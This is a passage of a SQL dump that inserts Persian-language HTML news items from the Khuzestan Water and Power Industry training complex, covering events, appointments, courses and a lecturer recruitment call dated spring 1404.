  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Unresolved Mention"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Smart Link"/>
 </w:LatentStyles>
</xml><![endif]--><!--[if gte mso 10]>
<style>
 /* Style Definitions */
 table.MsoNormalTable
	{mso-style-name:"Table Normal";
	mso-tstyle-rowband-size:0;
	mso-tstyle-colband-size:0;
	mso-style-noshow:yes;
	mso-style-priority:99;
	mso-style-parent:"";
	mso-padding-alt:0cm 5.4pt 0cm 5.4pt;
	mso-para-margin-top:0cm;
	mso-para-margin-right:0cm;
	mso-para-margin-bottom:8.0pt;
	mso-para-margin-left:0cm;
	line-height:107%;
	mso-pagination:widow-orphan;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;
	mso-ascii-font-family:Calibri;
	mso-ascii-theme-font:minor-latin;
	mso-hansi-font-family:Calibri;
	mso-hansi-theme-font:minor-latin;
	mso-bidi-font-family:Arial;
	mso-bidi-theme-font:minor-bidi;
	mso-font-kerning:1.0pt;
	mso-ligatures:standardcontextual;}
</style>
<![endif]--></p>
<p class="MsoNormal" dir="RTL" style="direction: rtl; unicode-bidi: embed; text-align: justify;">
	<span lang="AR-SA" style="font-family:&quot;Arial&quot;,sans-serif;mso-ascii-font-family:
Calibri;mso-ascii-theme-font:minor-latin;mso-hansi-font-family:Calibri;
mso-hansi-theme-font:minor-latin;mso-bidi-theme-font:minor-bidi">به گزارش روابط عمومی مجتمع آموزشی آب و برق خوزستان، اردوی راهیان پیشرفت با هدف ارتقای خودباوری، امیدآفرینی و تقویت اراده با حضور جمعی از دانشجویان و کارکنان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این اردو در محل شرکت آب جنوب شرق و با همکاری این شرکت برگزار گردید</span><span dir="LTR">. </span></p>
<p class="MsoNormal" dir="RTL" style="direction: rtl; unicode-bidi: embed; text-align: justify;">
	<span lang="AR-SA" style="font-family:&quot;Arial&quot;,sans-serif;mso-ascii-font-family:
Calibri;mso-ascii-theme-font:minor-latin;mso-hansi-font-family:Calibri;
mso-hansi-theme-font:minor-latin;mso-bidi-theme-font:minor-bidi">در این برنامه، شرکت&zwnj;کنندگان از اداره</span><span dir="LTR"> HSC </span><span lang="AR-SA" style="font-family:&quot;Arial&quot;,sans-serif;mso-ascii-font-family:Calibri;mso-ascii-theme-font:
minor-latin;mso-hansi-font-family:Calibri;mso-hansi-theme-font:minor-latin;
mso-bidi-theme-font:minor-bidi">و تصفیه&zwnj;خانه شرکت آب جنوب شرق بازدید کردند. در خلال این بازدید، توضیحات مفصلی درباره عملکرد و دستاوردهای این اداره ارائه شد که به درک بهتر دانشجویان از روند کار و اهمیت این صنعت کمک کرد</span><span dir="LTR">. </span></p>
<p class="MsoNormal" dir="RTL" style="direction: rtl; unicode-bidi: embed; text-align: justify;">
	<span lang="AR-SA" style="font-family:&quot;Arial&quot;,sans-serif;mso-ascii-font-family:
Calibri;mso-ascii-theme-font:minor-latin;mso-hansi-font-family:Calibri;
mso-hansi-theme-font:minor-latin;mso-bidi-theme-font:minor-bidi">علاوه بر بازدید از تأسیسات، دانشجویان همچنین از اسکله این شرکت دیدن کردند که به عنوان یکی از نقاط کلیدی در مدیریت منابع آبی و انتقال آب به شمار می&zwnj;رود</span><span dir="LTR">. </span></p>
<p class="MsoNormal" dir="RTL" style="direction: rtl; unicode-bidi: embed; text-align: justify;">
	<span lang="AR-SA" style="font-family:&quot;Arial&quot;,sans-serif;mso-ascii-font-family:
Calibri;mso-ascii-theme-font:minor-latin;mso-hansi-font-family:Calibri;
mso-hansi-theme-font:minor-latin;mso-bidi-theme-font:minor-bidi">در پایان این اردوی آموزشی، نهاری در مجموعه گیت بوستان برای شرکت&zwnj;کنندگان فراهم شد که فرصتی برای تبادل نظر و گفتگو درباره تجربیات به دست آمده در طول روز بود</span><span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '62293ordo.jpg', 137, '1404/2/14', '1:26:15 AM', 1404, 'اردیبهشت', 2, '14');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62294, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری نمایشگاه اینوتکس ۲۰۲۵ در پارک فناوری پردیس', '<p style="text-align: justify;">
	<span dir="RTL">نمایشگاه اینوتکس </span><span dir="RTL">۲۰۲۵</span> <span dir="RTL">از نهم تا دوازدهم اردیبهشت در پارک فناوری پردیس برگزار شد. این رویداد ملی با حضور بیش از </span><span dir="RTL">۴۵۰</span> <span dir="RTL">شرکت نوآور، </span><span dir="RTL">۱۵۰</span> <span dir="RTL">سرمایه&zwnj;گذار و یکصد هزار بازدیدکننده از زیست بوم نوآوری و فناوری، به برگزاری بیش از </span><span dir="RTL">۴۰۰</span> <span dir="RTL">جلسه</span> B<span dir="RTL">۲</span>B <span dir="RTL">و </span><span dir="RTL">۲۰</span> <span dir="RTL">رویداد علمی پرداخت</span>.</p>', '<p dir="RTL" style="text-align: justify;">
	نمایشگاه اینوتکس ۲۰۲۵ از نهم تا دوازدهم اردیبهشت در پارک فناوری پردیس برگزار شد. این رویداد ملی با حضور بیش از ۴۵۰ شرکت نوآور، ۱۵۰ سرمایه&zwnj;گذار و یکصد هزار بازدیدکننده از زیست بوم نوآوری و فناوری، به برگزاری بیش از ۴۰۰ جلسه<span dir="LTR"> B</span>۲<span dir="LTR">B </span>و ۲۰ رویداد علمی پرداخت<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در بخش&zwnj;های جنبی نمایشگاه، استیج اینوتکس با هدف اتصال ایده&zwnj;های جذاب و گفتگوهای نوآورانه، به بررسی آینده کسب و کارها و نقش فناوری&zwnj;های نوظهور پرداخت. همچنین فروم حکمرانی و قانون&zwnj;گذاری با نگاهی به سیاست&zwnj;گذاری نوآوری و فناوری کشور، و رویدادهای شبکه&zwnj;سازی مانند اینونایت و کافه سرمایه برای تأمین منابع مالی برگزار شد. پاویون مشاوران نیز خدمات مشاوره&zwnj;ای متناسب با نیازهای اکوسیستم فناوری ارائه کرد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	از دیگر رویدادهای مهم نمایشگاه می&zwnj;توان به ریسرچ پیج، اینوتکس پیج و رقابت استارتاپ&zwnj;ها اشاره کرد که در حضور سرمایه&zwnj;گذاران و با امتیازدهی داوران ایرانی و بین&zwnj;المللی برگزار شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	همچنین، با توجه به مشارکت مؤثر مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در رقابت&zwnj;های مقدماتی این رویداد، ریاست مجتمع (دکتر هودگر)، معاونت برنامه&zwnj;ریزی آموزشی (دکتر عرب زاده) و مدیر مرکز رشد شهدای صنعت آب و برق (مهندس لیمویی) به عنوان میهمانان ویژه در این رویداد حضور داشتند<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '62294Untitled.jpg', 1052, '1404/2/20', '3:07:53 AM', 1404, 'اردیبهشت', 2, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62295, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'توسعه همکاری‌های مجتمع آموزشی آب و برق خوزستان و مرکز آموزشی حرم مطهر امام رضا علیه السلام', '<p dir="RTL" style="text-align: justify;">
	در روز پنجشنبه، ۱۸ اردیبهشت، و در آستانه میلاد با سعادت امام رضا علیه&zwnj;السلام، توافقی جامع و مهم در زمینه همکاری&zwnj;های آموزشی میان مجتمع آب و برق خوزستان و مرکز آموزش حرم مطهر رضوی منعقد گردید<span dir="LTR"> . </span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	در روز پنجشنبه، ۱۸ اردیبهشت، و در آستانه میلاد با سعادت امام رضا علیه&zwnj;السلام، توافقی جامع و مهم در زمینه همکاری&zwnj;های آموزشی میان مجتمع آب و برق خوزستان و مرکز آموزش حرم مطهر رضوی منعقد گردید<span dir="LTR"> . </span></p>
<p dir="RTL" style="text-align: justify;">
	انتظار می&zwnj;رود این همکاری در آینده نزدیک به برگزاری کارگاه&zwnj;ها و دوره&zwnj;های تخصصی در زمینه&zwnj;های مختلف منجر شود و از طرف دیگر، با توجه به ارتباطات فرهنگی و مذهبی، فرصتی برای ترویج ارزش&zwnj;های انسانی و اخلاقی نیز فراهم آورد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '62295reza.jpg', 128, '1404/2/20', '3:16:20 AM', 1404, 'اردیبهشت', 2, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (63294, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'تجلیل از کارکنان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان؛ تاکید بر ارزیابی فصلی عملکرد', '<p dir="RTL">
	مراسم تجلیل و تقدیر از کارکنان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور مدیران و کارکنان این مجتمع برگزار شد<span dir="LTR">. </span>در این مراسم، دکتر مهدی هودگر، ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، ضمن خوشامدگویی به حاضران، از تلاش&zwnj;های خالصانه و صادقانه کارکنان در راستای اهداف مجتمع قدردانی کرد و نقش آن&zwnj;ها را در پیشبرد برنامه&zwnj;ها و تحقق اهداف سازمانی مهم ارزیابی کرد. وی با اشاره به اهمیت نیروی انسانی متخصص و متعهد در توسعه و پیشرفت صنعت آب و برق، بر لزوم توجه به ارتقای دانش و مهارت&zwnj;های کارکنان تاکید کرد<span dir="LTR">. </span></p>
<p>
	&nbsp;</p>', '<p dir="RTL">
	مراسم تجلیل و تقدیر از کارکنان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور مدیران و کارکنان این مجتمع برگزار شد<span dir="LTR">. </span>در این مراسم، دکتر مهدی هودگر، ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، ضمن خوشامدگویی به حاضران، از تلاش&zwnj;های خالصانه و صادقانه کارکنان در راستای اهداف مجتمع قدردانی کرد و نقش آن&zwnj;ها را در پیشبرد برنامه&zwnj;ها و تحقق اهداف سازمانی مهم ارزیابی کرد. وی با اشاره به اهمیت نیروی انسانی متخصص و متعهد در توسعه و پیشرفت صنعت آب و برق، بر لزوم توجه به ارتقای دانش و مهارت&zwnj;های کارکنان تاکید کرد<span dir="LTR">. </span></p>
<p dir="RTL">
	دکتر هودگر در ادامه سخنان خود، از رویکرد جدید مجتمع در ارزیابی عملکرد کارکنان خبر داد و اعلام کرد که از سال جدید، عملکرد کارکنان به صورت فصلی مورد ارزیابی قرار خواهد گرفت. وی هدف از این اقدام را ایجاد انگیزه بیشتر در بین کارکنان، شناسایی نقاط قوت و ضعف و ارائه بازخورد سازنده برای بهبود عملکرد عنوان کرد. به گفته وی، این ارزیابی&zwnj;ها به صورت شفاف و عادلانه انجام خواهد شد و نتایج آن در تصمیم&zwnj;گیری&zwnj;های مربوط به ارتقاء و تشویق کارکنان لحاظ خواهد شد<span dir="LTR">. </span></p>
<p dir="RTL">
	<span dir="RTL">در پایان این مراسم، از تعدادی از کارکنان و مدیران فعال مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با اهدای لوح تقدیر قدردانی شد</span></p>
<p>
	&nbsp;</p>', '62296Untitledsss.jpg', 72, '1404/2/27', '3:57:18 AM', 1404, 'اردیبهشت', 2, '27');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (63295, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری دوره آموزشی آرشیو و مستندسازی روابط عمومی با محوریت هوش مصنوعی در خوزستان', '<p dir="RTL" style="text-align: justify;">
	دوره آموزشی آرشیو و مستندسازی در روابط عمومی با هدف ارتقای دانش و مهارت مدیران و کارشناسان روابط عمومی شرکت&zwnj;های تابعه آب و برق خوزستان، در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق این استان برگزار شد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	دوره آموزشی آرشیو و مستندسازی در روابط عمومی با هدف ارتقای دانش و مهارت مدیران و کارشناسان روابط عمومی شرکت&zwnj;های تابعه آب و برق خوزستان، در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق این استان برگزار شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	این دوره آموزشی به بررسی مباحث کلیدی در زمینه آرشیو و مستندسازی در روابط عمومی&zwnj;ها، اهداف و استانداردهای این حوزه، و بهره&zwnj;گیری از فناوری&zwnj;های نوین به ویژه هوش مصنوعی در بهبود فرآیندهای کاری پرداخت<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در حاشیه این دوره، شرکت&zwnj;کنندگان از شبکه جهانی الاهواز بازدید کردند. در این بازدید، مدیران رسانه الاهواز ضمن معرفی این شبکه، به تشریح فعالیت&zwnj;ها و دستاوردهای آن پرداختند. مجید خطیب، مدیر روابط عمومی شبکه الاهواز، ضمن خوشامدگویی به مدیران روابط عمومی شرکت های تابعه سازمان آب و برق خوزستان، به ارائه گزارشی از عملکرد شبکه پرداخت<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	مهندس حردانی، معاون اجرایی شبکه الاهواز نیز با حضور در جمع شرکت&zwnj;کنندگان، به مباحث فنی و آموزشی در حوزه تولید محتوا، آرشیو، و نحوه پخش برنامه&zwnj;ها پرداخت و تجربیات خود را در این زمینه به اشتراک گذاشت. در ادامه این بازدید، شرکت&zwnj;کنندگان از استودیوها و اتاق فرمان شبکه الاهواز بازدید کردند و با تجهیزات و فرآیندهای فنی تولید و پخش برنامه&zwnj;ها آشنا شدند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در پایان دوره، شرکت&zwnj;کنندگان ضمن ابراز رضایت از محتوای ارائه شده و کیفیت برگزاری، خواستار تداوم برگزاری دوره&zwnj;های مشابه در آینده شدند<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '63295Untitledfff.jpg', 82, '1404/2/27', '4:01:07 AM', 1404, 'اردیبهشت', 2, '27');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (63296, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'تمدید فراخوان جذب مدرس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان سال۱۴۰۴', '<p style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان جهت تکمیل تیم مدرسان گروه های تخصصی خود از مدرسین،اساتید٬همکاران متخصص در صنعت آب و برق و کلیه علاقه مندان به تدریس در حوزه های مرتبط دعوت به همکاری می کند.</p>', '<p style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان جهت تکمیل تیم مدرسان گروه های تخصصی خود از مدرسین،اساتید٬همکاران متخصص در صنعت آب و برق و کلیه علاقه مندان به تدریس در حوزه های مرتبط دعوت به همکاری می کند.<br />
	کلیه علاقه مندان به همکاری می توانند رزومه علمی و کاری خود را تا ۱۵ اردیبهشت ماه در آدرس ذیل بارگذاری نمایند.:</p>
<p style="text-align: center;">
	<span style="font-size:14px;"><a href="https://kwphc.ir/LecturerReg.aspx"><span style="color:#800080;">Https://www.Kwphc.ir/LecturerReg</span></a></span></p>
<p style="text-align: justify;">
	<span style="color:#b22222;"><strong>✓</strong></span> <span style="color:#9900cc;"><strong>دپارتمان عمومی و مدیریت شامل رشته های:</strong></span><br />
	مدیریت(دولتی، مالی و بازرگانی، کسب و کار، اجرایی، آموزشی، استراتژیک و ...)، حقوق، قراردادها، اقتصاد، حسابداری، روانشناسی، جامعه شناسی، صنایع، آمار، علوم سیاسی،&nbsp; کلیه گرایش های مهندسی کامپیوتر، بیمه، کتابداری، برنامه ریزی و علوم تربیتی<br />
	<br />
	<span style="color:#b22222;"><strong>✓</strong></span><span style="color:#9900cc;"><strong> دپارتمان آموزشی تخصصی آب و آبفا و بهداشت ، ایمنی و محیط زیست شامل رشته های:</strong></span><br />
	&nbsp;مهندسی نقشه برداری در کلیه گرایش های GIS&nbsp; ، فتوگرامتری ، سنجش از دور و میکروژئودزی<br />
	مهندسی عمران در کلیه گرایش های آب ، سازه ، ساختمان ، زلزله و ژئوتکنیک<br />
	مهندسی سازه های آبی<br />
	مهندسی زمین شناسی<br />
	مهندسی HSE<br />
	مهندسی علوم آب، هیدرولوژی<br />
	مهندسی آبیاری و زهکشی<br />
	مهندسی کشاورزی گرایش سازه های آبی<br />
	رشته حقوق (آب)<br />
	<br />
	<span style="color:#b22222;"><strong>✓</strong></span> <span style="color:#9900cc;"><strong>دپارتمان برق، انرژی و نیروگاه شامل رشته های:</strong></span><br />
	&nbsp;مهندسی برق، مکانیک، الکترونیک، صنایع و گرایش های: کنترل، ابزاردقیق، سیستم های قدرت، الکترونیک، الکترونیک قدرت، مخابرات، انرژی های تجدید پذیر، مکانیک سیالات، دینامیک، کنترل و ارتعاشات</p>
<p>
	&nbsp;</p>', '63296Untitledffff.jpg', 139, '1404/2/27', '4:05:31 AM', 1404, 'اردیبهشت', 2, '27');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (63297, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری طرح دسته‌جمعی قرائت قرآن کریم به مناسبت روز شهدای خدمت در مراکز آموزش علمی کاربردی خوزستان', '<p dir="RTL">
	به اطلاع می ساند با توجه به ثبت روز ۳۰ اردیبهشت به عنوان روز شهدای خدمت در متن تقویم رسمی کشور توسط رئیس محترم جمهور و رئیس شورای عالی انقلاب فرهنگی و به منظور پاسداشت مقام شامخ شهدای این روز شهید جمهور آیت الله سید ابراهیم رئیسی و هیات همراه اداره کل امور دانشجویان شاهد و ایثارگر در نظر دارد طرح دسته جمعی قرائت قرآن کریم را در روز ۳۰ اردیبهشت ماه به صورت سراسری در مراکز آموزش علمی کاربردی به نیت شادی روح شهدای خدمت برگزار نماید.</p>
<p>
	&nbsp;</p>', '<p dir="RTL">
	به اطلاع می ساند با توجه به ثبت روز ۳۰ اردیبهشت به عنوان روز شهدای خدمت در متن تقویم رسمی کشور توسط رئیس محترم جمهور و رئیس شورای عالی انقلاب فرهنگی و به منظور پاسداشت مقام شامخ شهدای این روز شهید جمهور آیت الله سید ابراهیم رئیسی و هیات همراه اداره کل امور دانشجویان شاهد و ایثارگر در نظر دارد طرح دسته جمعی قرائت قرآن کریم را در روز ۳۰ اردیبهشت ماه به صورت سراسری در مراکز آموزش علمی کاربردی به نیت شادی روح شهدای خدمت برگزار نماید.</p>
<p>
	&nbsp;</p>', '63297photoqoran.jpg', 105, '1404/2/29', '12:27:58 PM', 1404, 'اردیبهشت', 2, '29');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (64294, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری ارزیابی صلاحیت حرفه‌ای نیروهای پیمانکار شرکت توزیع نیروی برق اهواز', '<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;"><strong>صلاحیت حرفه&zwnj;ای نیروهای فنی و تخصصی شرکت&zwnj;های پیمانکار زیرمجموعه شرکت توزیع نیروی برق اهواز در مشاغل &quot;فن&zwnj;ورز عملیات و اتفاقات شبکه، فن&zwnj;ورز تعمیرات شبکه و پست، فن&zwnj;ورز خط گرم و فن&zwnj;ورز نصب و اصلاح لوازم اندازه&zwnj;گیری&quot; طی سه روز، از ۲۳ لغایت ۲۵ اردیبهش&zwnj; ماه ۱۴۰۴ در مجتمع آموزشی صنعت آب و برق خوزستان برگزار گردید<span dir="LTR">.</span></strong></span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;"><strong>صلاحیت حرفه&zwnj;ای نیروهای فنی و تخصصی شرکت&zwnj;های پیمانکار زیرمجموعه شرکت توزیع نیروی برق اهواز در مشاغل &quot;فن&zwnj;ورز عملیات و اتفاقات شبکه، فن&zwnj;ورز تعمیرات شبکه و پست، فن&zwnj;ورز خط گرم و فن&zwnj;ورز نصب و اصلاح لوازم اندازه&zwnj;گیری&quot; طی سه روز، از ۲۳ لغایت ۲۵ اردیبهش&zwnj; ماه ۱۴۰۴ در مجتمع آموزشی صنعت آب و برق خوزستان برگزار گردید<span dir="LTR">.</span></strong></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;"><strong>این برنامه با حضور بیش از ۲۶۰ نفر از نیروهای پیمانکار و ارزیابانی از استان&zwnj;های مختلف کشور، در ایستگاه&zwnj;های تخصصی شامل آزمون دانشی، شناخت تجهیزات ایمنی، خط گرم، لوازم اندازه&zwnj;گیری و تجهیزات و یراق شناسی شبکه، طب کار و روانشناسی برگزار گردید. ارزیابی توسط مجتمع آموزشی صنعت آب و برق خوزستان و با همکاری شرکت توزیع نیروی برق اهواز و انجمن صنفی شرکت&zwnj;های توزیع، همچنین حمایت شرکت توانیر انجام شد</strong></span></p>
<p>
	&nbsp;</p>', '63298azmoonnbargh.jpg', 140, '1404/3/2', '4:33:34 PM', 1404, 'خرداد', 3, '2');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (64295, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'تقدیر ریاست دانشگاه جامع علمی‌کاربردی خوزستان از مرکز آموزشی آب و برق بخاطر برگزاری دوره «حامیم»', '<p dir="RTL" style="text-align: justify;">
	در آیینی با حضور دکتر بهرهی ، ریاست محترم دانشگاه جامع علمی&zwnj;کاربردی استان خوزستان، از زحمات و اقدامات ارزشمند دکتر هودگر ریاست محترم مرکز آموزشی علمی کاربردی آب و برق خوزستان و همچنین مهندس محمد طاهر دباغ مسئول امور فرهنگی مرکز در خصوص اجرای برنامه فرهنگی بویژه برگزاری دوره توانمندسازی دانشجویان تحت عنوان &laquo;حلقه&zwnj;های میانی؛ حامیم&raquo; تقدیر به عمل آمد<span dir="LTR">.&nbsp; </span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	در آیینی با حضور دکتر بهرهی ، ریاست محترم دانشگاه جامع علمی&zwnj;کاربردی استان خوزستان، از زحمات و اقدامات ارزشمند دکتر هودگر ریاست محترم مرکز آموزشی علمی کاربردی آب و برق خوزستان و همچنین مهندس محمد طاهر دباغ مسئول امور فرهنگی مرکز در خصوص اجرای برنامه فرهنگی بویژه برگزاری دوره توانمندسازی دانشجویان تحت عنوان &laquo;حلقه&zwnj;های میانی؛ حامیم&raquo; تقدیر به عمل آمد<span dir="LTR">.&nbsp; </span></p>
<p dir="RTL" style="text-align: justify;">
	این دوره آموزشی که به همت نهاد نمایندگی مقام معظم رهبری و در دانشگاه علمی&zwnj;کاربردی و با میزبانی مرکز علمی کاربردی صنعت آب و برق خوزستان برگزار شد، با استقبال چشمگیر دانشجویان فعال فرهنگی، اجتماعی و سیاسی همراه بود<span dir="LTR">.&nbsp; </span></p>
<p dir="RTL" style="text-align: justify;">
	دکتر بهرهی در این مراسم با اشاره به محورهای غنی این دوره شامل &laquo;گام دوم انقلاب&raquo;، &laquo;جوانان پیشرو&raquo;، &laquo;مسئولیت و سازندگی&raquo;، &laquo;مشاوره توسعه کسب&zwnj;وکار&raquo;، &laquo;دشمن&zwnj;شناسی&raquo; و &laquo;کار تشکیلاتی&raquo;، این اقدام را گامی بلند در جهت تربیت نیروهای متعهد و انقلابی دانستند<span dir="LTR">.&nbsp; </span></p>
<p dir="RTL" style="text-align: justify;">
	ریاست دانشگاه جامع علمی&zwnj;کاربردی خوزستان در ادامه از همکاری&zwnj;های سازنده مرکز آموزشی و پژوهشی صنعت آب و برق خوزستان تقدیر نمود و بر تداوم چنین برنامه&zwnj;های اثرگذاری در راستای توانمندسازی نسل جوان تأکید کرد<span dir="LTR">.&nbsp; </span></p>
<p>
	&nbsp;</p>', '64295taghdirhamim.jpg', 137, '1404/3/2', '4:35:20 PM', 1404, 'خرداد', 3, '2');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (64296, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'مراسم تودیع و معارفه مدیران در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد', '<p>
	<span dir="RTL">مراسم تودیع و معارفه مدیران مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور دکتر مهدی هودگر، ریاست این مجتمع، برگزار شد. در این مراسم، ضمن تقدیر از خدمات مدیران پیشین، انتصابات جدیدی در حوزه&zwnj;های آموزشی و اداری انجام شد</span>.&nbsp;&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">&nbsp;مراسم تودیع و معارفه مدیران مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور دکتر مهدی هودگر، ریاست این مجتمع، برگزار شد. در این مراسم، ضمن تقدیر از خدمات مدیران پیشین، انتصابات جدیدی در حوزه&zwnj;های آموزشی و اداری انجام شد<span dir="LTR">.&nbsp;</span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;"><span dir="LTR">🔰</span> انتصابات جدید در حوزه آموزش<span dir="LTR"> :</span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">در ابتدای این مراسم، دکتر هودگر با تقدیر از زحمات آرش ساردوئی در اداره آموزش بلندمدت، وی را به سمت سرپرست گروه آموزشی آب، آبفا و<span dir="LTR"> HSE</span>منصوب کرد.&nbsp;همچنین، فاطمه دشتستانی به عنوان سرپرست جدید اداره آموزش بلندمدت معرفی شد. ریاست مجتمع در این بخش بر اهمیت توسعه کیفی برنامه&zwnj;های آموزشی و نقش این مدیران در ارتقای سطح آموزش&zwnj;های تخصصی صنعت آب و برق تأکید کرد<span dir="LTR">.&nbsp;</span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR" style="font-size: 14px;">🔰</span><span style="font-size: 14px;"> تغییرات در اداره بودجه و قراردادها</span><span dir="LTR" style="font-size: 14px;">:</span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">&nbsp;در ادامه مراسم، از خدمات آقای نصیریان در اداره بودجه و قراردادها تقدیر شد و خانم رضوان بیت سیاح به عنوان سرپرست جدید این اداره منصوب گردید. دکتر هودگر با اشاره به اهمیت مدیریت مالی و انعقاد قراردادهای اثربخش، خواستار تحقق اهداف کلان مجموعه در این حوزه شد<span dir="LTR">.&nbsp;</span>دکتر مهدی هودگر در پایان این مراسم، ضمن آرزوی موفقیت برای مدیران جدید، از تمامی همکاران خواست تا با همکاری و تعامل بیشتر، در راستای پیشبرد اهداف آموزشی و پژوهشی مجتمع گام بردارند. وی همچنین قدردانی صمیمانه&zwnj;ای از مدیران سابق به عمل آورد و خاطرنشان کرد که تجربیات و تلاش&zwnj;های آنان، زمینه&zwnj;ساز تحولات آینده خواهد بود<span dir="LTR">.&nbsp;</span></span></p>
<p>
	&nbsp;</p>', '64296photojalase.jpg', 176, '1404/3/6', '2:55:05 PM', 1404, 'خرداد', 3, '6');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (64297, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری دوره تخصصی "مدیریت آموزشی بر اساس استاندارد ISO 10015" در نیروگاه کرخه', '<p dir="RTL" style="text-align: justify;">
	<strong>در راستای ارتقای دانش تخصصی کارکنان صنعت آب و برق، دوره آموزشی &laquo;مدیریت آموزشی بر اساس استاندارد </strong><strong><span dir="LTR">ISO 10015</span></strong><strong>&raquo; با حضور جمعی از همکاران در محل سد و نیروگاه کرخه برگزار شد. این دوره که در تاریخ ۳۱ اردیبهشت ۱۴۰۴ برگزار گردید، با هدف توانمندسازی منابع انسانی و بهبود کیفیت فرآیندهای آموزشی طراحی شده بود.&nbsp; </strong></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	<strong>در راستای ارتقای دانش تخصصی کارکنان صنعت آب و برق، دوره آموزشی &laquo;مدیریت آموزشی بر اساس استاندارد </strong><strong><span dir="LTR">ISO 10015</span></strong><strong>&raquo; با حضور جمعی از همکاران در محل سد و نیروگاه کرخه برگزار شد. این دوره که در تاریخ ۳۱ اردیبهشت ۱۴۰۴ برگزار گردید، با هدف توانمندسازی منابع انسانی و بهبود کیفیت فرآیندهای آموزشی طراحی شده بود.&nbsp; </strong></p>
<p dir="RTL" style="text-align: justify;">
	<strong>جلسه افتتاحیه با سخنرانی مهندس صالحی فر، مدیرعامل سد و نیروگاه کرخه، و دکتر هودگر، رئیس مجتمع عالی آموزشی صنعت آب و برق خوزستان، آغاز شد. سپس دکتر اباصلت خراسانی، دانشیار دانشگاه شهید بهشتی، به عنوان مدرس دوره، مباحث تخصصی را در قالب کارگاه&zwnj;های تعاملی ارائه داد.&nbsp;</strong></p>
<p dir="RTL" style="text-align: justify;">
